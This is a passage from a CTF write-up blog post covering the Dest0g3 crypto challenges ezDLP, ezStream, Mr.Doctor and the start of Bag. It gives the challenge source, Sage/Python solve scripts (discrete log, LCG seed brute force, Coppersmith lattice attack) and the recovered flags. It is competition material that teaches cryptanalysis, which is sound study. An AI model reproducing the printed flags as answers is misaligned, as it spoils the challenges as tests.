b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">h = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DLP求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = </span><br><span class="line">h = </span><br><span class="line">x = discrete_log(mod(h,p),mod(g,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezStream"><a href="#ezStream" class="headerlink" title="ezStream"></a>ezStream</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">8</span>] == <span class="string">&quot;Dest0g3&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.b = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.a, self.b, self.m))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line">lcg.output()</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="built_in">ord</span>(flag[i]) ^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 3939333498</span></span><br><span class="line"><span class="string">b = 3662432446</span></span><br><span class="line"><span class="string">m = 2271373817</span></span><br><span class="line"><span class="string">state1 = 17362</span></span><br><span class="line"><span class="string">state2 = 20624</span></span><br><span class="line"><span class="string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>LCG，爆破求seed：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3939333498</span></span><br><span class="line">b = <span class="number">3662432446</span></span><br><span class="line">m = <span class="number">2271373817</span></span><br><span class="line">state1 = <span class="number">17362</span></span><br><span class="line">state2 = <span class="number">20624</span></span><br><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    s1 = (state1&lt;&lt;<span class="number">16</span>)+i</span><br><span class="line">    s2 = (a*s1+b) % m</span><br><span class="line">    <span class="keyword">if</span> s2&gt;&gt;<span class="number">16</span> == state2:</span><br><span class="line">        seed = ((s1-b)*inverse_mod(a,m))%m</span><br><span class="line">        <span class="built_in">print</span>(seed)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 1315807869</span></span><br><span class="line"><span class="comment"># 710396196</span></span><br><span class="line"><span class="comment"># 104984523</span></span><br></pre></td></tr></table></figure><p>三个结果分别代入求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line">seed = [<span class="number">1315807869</span>,<span class="number">710396196</span>,<span class="number">104984523</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> seed:</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">            self.a = <span class="number">3939333498</span></span><br><span class="line">            self.b = <span class="number">3662432446</span></span><br><span class="line">            self.m = <span class="number">2271373817</span></span><br><span class="line">            self.seed = k</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">            self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">            <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    lcg = LCG()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(c[i] ^^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|</span></span><br><span class="line"><span class="comment"># Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;</span></span><br><span class="line"><span class="comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Mr-Doctor"><a href="#Mr-Doctor" class="headerlink" title="Mr.Doctor"></a>Mr.Doctor</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()[<span class="number">8</span>:-<span class="number">1</span>]</span><br><span class="line">seed = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SHA256</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.proof = []</span><br><span class="line">        self.sha = <span class="number">0</span></span><br><span class="line">        self.sha_flag = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encryption</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // <span class="number">4</span>):</span><br><span class="line">            self.proof.append(flag[<span class="number">4</span> * i:<span class="number">4</span> + <span class="number">4</span> * i])</span><br><span class="line">            self.sha = sha256(self.proof[i]).hexdigest().encode()</span><br><span class="line">            self.sha_flag.append(bytes_to_long(self.sha))</span><br><span class="line">        <span class="keyword">return</span> self.sha_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RHODES_ELITE</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.Doctor = getPrime(<span class="number">64</span>)</span><br><span class="line">        self.Amiya = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Rosmontis = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Blaze = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.seed = seed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Amiya = &quot;</span>, self.Amiya)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blaze = &quot;</span>, self.Blaze)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Doctor = &quot;</span>, self.Doctor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sha = SHA256()</span><br><span class="line">sha_flag = sha.encryption()</span><br><span class="line">elite = RHODES_ELITE()</span><br><span class="line">elite.output()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ash = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SliverAsh = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line">W = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="number">3</span>) ^ (elite.<span class="built_in">next</span>() % <span class="number">100</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sha_flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(W))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Amiya =  956366446278</span></span><br><span class="line"><span class="string">Rosmontis =  1061992537343</span></span><br><span class="line"><span class="string">Blaze =  636205571590</span></span><br><span class="line"><span class="string">Doctor =  18068433704538283397</span></span><br><span class="line"><span class="string">Ash =  1097363493609113</span></span><br><span class="line"><span class="string">SliverAsh =  2051431344160327</span></span><br><span class="line"><span class="string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>二阶LCG + 4位一轮爆破，用二元Coppersmith方法求seed：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">        R = f.base_ring()</span><br><span class="line">        N = R.cardinality()</span><br><span class="line">        f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">        f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">        G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">            base = N ^ (m - i) * f ^ i</span><br><span class="line">            <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">                g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">                G.append(g)</span><br><span class="line"></span><br><span class="line">        B, monomials = G.coefficient_matrix()</span><br><span class="line">        monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">        factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">        B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">        B = B.change_ring(QQ)</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">        H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">            H.append(h)</span><br><span class="line">            I = H.ideal()</span><br><span class="line">            <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">                H.pop()</span><br><span class="line">            <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">                roots = []</span><br><span class="line">                <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                    root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                    roots.append(root)</span><br><span class="line">                    <span class="keyword">return</span> roots</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">a = <span class="number">956366446278</span></span><br><span class="line">b = <span class="number">1061992537343</span></span><br><span class="line">c = <span class="number">636205571590</span></span><br><span class="line">p = <span class="number">18068433704538283397</span></span><br><span class="line">state1 = <span class="number">1097363493609113</span></span><br><span class="line">state2 = <span class="number">2051431344160327</span></span><br><span class="line">PR.&lt; s1_low, s2_low &gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * ((state1 &lt;&lt; <span class="number">12</span>) + s1_low) ^ <span class="number">2</span> + b * ((state1 &lt;&lt; <span class="number">12</span>) + s1_low) + c - (state2 &lt;&lt; <span class="number">12</span>) - s2_low</span><br><span class="line">state1 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">0</span>] + (state1 &lt;&lt; <span class="number">12</span>)</span><br><span class="line">state2 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">1</span>] + (state2 &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * x * x + b * x + c - state1</span><br><span class="line">seed = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 626844643882</span></span><br></pre></td></tr></table></figure><p>代入逐4位爆破flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lcg</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.p = <span class="number">18068433704538283397</span></span><br><span class="line">        self.a = <span class="number">956366446278</span></span><br><span class="line">        self.b = <span class="number">1061992537343</span></span><br><span class="line">        self.c = <span class="number">636205571590</span></span><br><span class="line">        self.seed = <span class="number">626844643882</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed * self.seed + self.b * self.seed + self.c) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">l = lcg()</span><br><span class="line">seed = l.seed</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">c = <span class="number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line">c = <span class="built_in">hex</span>(c)[<span class="number">2</span>:].rjust(<span class="number">9</span>*<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef-&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>(<span class="params">nowc</span>):</span><br><span class="line">    <span class="built_in">print</span>(nowc)</span><br><span class="line">    t=l.<span class="built_in">next</span>()</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    <span class="keyword">return</span> mbruteforce(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(<span class="built_in">int</span>(sha256(x).hexdigest().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)%(seed**<span class="number">3</span>)^(t%<span class="number">100</span>))[<span class="number">2</span>:].rjust(<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>) == nowc, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    flag += <span class="built_in">pow</span>(c[<span class="number">30</span>*i:<span class="number">30</span>*(i+<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d2a4d1af-8a80-8794-99ac-635f89494cac</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Bag"><a href="#Bag" class="headerlink" title="Bag"></a>Bag</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">message = bytes_to_long(flag[<span class="number">8</span>:-<span class="number">1</span>])</span><br><span class="line">Baglenth=<span class="number">286</span></span><br><span class="line">Bag=[]</span><br><span class="line">Bag=Bag[::-<span class="number">1</span>]</span><br><span class="line">m=<span class="number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span></span><br><span class="line">w=<span class="number">274062421102700155372289583695782343443</span></span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(m,w)==<span 